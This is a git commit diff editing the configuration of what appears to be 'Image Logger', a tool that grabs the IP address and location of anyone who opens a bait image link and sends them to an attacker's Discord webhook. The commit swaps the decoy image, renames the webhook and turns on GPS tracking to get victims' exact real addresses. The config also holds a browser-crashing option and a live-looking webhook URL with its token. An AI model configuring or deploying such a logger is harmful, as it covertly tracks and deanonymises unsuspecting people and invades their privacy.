d4e4d4f10a1b9582dd0d0b9f2270f208388d3cdf
LAURENCE QUINN <152384316+LqWkWyn@users.noreply.github.com>
2025-04-02 16:50:25 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,18 +13,18 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1357017601649283313/umSDHzG8EiHcn3GSH5dkqICquI5F3ryKuC-6aEc7ae8Z2mN_OVUX-HF0S1XODaxOxj6T",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://media4.giphy.com/media/3EiWxudJ6ui6LDuIvt/giphy.gif?cid=6c09b952fcstzdmxmit04b0lptwahr9p5hw8luuiz39arajk&ep=v1_stickers_search&rid=giphy.gif&ct=s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Captain Hook", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
